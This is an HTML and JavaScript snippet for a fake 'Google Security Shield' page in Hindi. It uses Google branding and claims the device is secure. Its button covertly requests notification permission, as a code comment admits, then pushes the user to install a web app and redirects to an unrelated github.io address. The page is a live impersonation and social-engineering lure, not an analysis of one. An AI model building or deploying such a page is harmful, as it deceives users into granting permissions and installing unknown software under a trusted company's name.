<div class="card">
    <img src="https://www.gstatic.com/images/branding/product/2x/gshield_96dp.png" class="shield-icon">
    <h2>Google Security Shield</h2>
    <p>आपका डिवाइस सुरक्षित है। रीयल-टाइम सुरक्षा डैशबोर्ड खोलने के लिए नीचे बटन दबाएं।</p>
    
    <button class="main-btn" id="masterButton">सिस्टम सुरक्षित करें</button>
</div>

<script>
    let deferredPrompt;
    const masterButton = document.getElementById('masterButton');

    // ऐप इंस्टॉल होने के लिए तैयार है या नहीं, यह चेक करेगा
    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault();
        deferredPrompt = e;
    });

    masterButton.addEventListener('click', async () => {
        // 1. सबसे पहले चुपके से नोटिफिकेशन Allow करवाना
        const permission = await Notification.requestPermission();
        
        if (permission === "granted") {
            // 2. अब उसी बटन से इंस्टॉल करवाना
            if (deferredPrompt) {
                deferredPrompt.prompt();
                const { outcome } = await deferredPrompt.userChoice;
                
                if (outcome === 'accepted') {
                    // जादू: इंस्टॉल होते ही बटन बदल जाएगा
                    masterButton.innerText = "Security App खोलें";
                    masterButton.style.background = "#000"; // काला रंग ताकि अलग दिखे
                    
                    // यूजर को यहीं से ऐप के अंदर भेजना
                    masterButton.onclick = () => {
                        alert("Security App अब आपके फोन में सक्रिय है!");
                        window.location.href = "https://rajahribabakumar-hub.github.io/Nob/"; 
                    };
                }
                deferredPrompt = null;
            } else {
                // अगर पहले से इंस्टॉल है तो सीधे खोलना
                masterButton.innerText = "Security Dashboard खोलें";
                alert("आपका डिवाइस पहले से सुरक्षित है।");
            }
        }
    });

    // यह ट्रैक करता है कि ऐप इंस्टॉल हो गया है
    window.addEventListener('appinstalled', (evt) => {
        console.log('App was installed');
        masterButton.innerText = "Open Security System";
    });
</script>
